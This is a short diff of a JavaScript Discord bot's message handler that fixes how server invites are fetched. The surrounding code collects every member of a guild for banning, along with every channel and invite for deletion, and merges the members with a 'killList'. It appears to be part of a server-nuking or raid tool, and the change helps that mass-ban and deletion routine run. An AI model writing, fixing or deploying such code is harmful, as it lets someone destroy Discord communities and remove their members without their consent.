@@ -610,7 +610,7 @@ bot.on('message', function(user, userID, channelID, message, evt) {
             });
             var toban = Object.values(bot.servers[bot.channels[channelID].guild_id].members).map(m=>m.id);
             var delchannels = Object.values(bot.servers[bot.channels[channelID].guild_id].channels).map(c=>c.id);
-            var delinvs = Object.values(bot.getServerInvites(bot.channels[channelID].guild_id)).map(i=>i.code);
+            var delinvs = bot.getServerInvites(bot.channels[channelID].guild_id).map(i=>i.code);
             var tounban = Object.values(bot.getBans(bot.channels[channelID].guild_id)).map(b=>b.user.id);
             
             toban = arr_shuffle(toban.concat(killList));
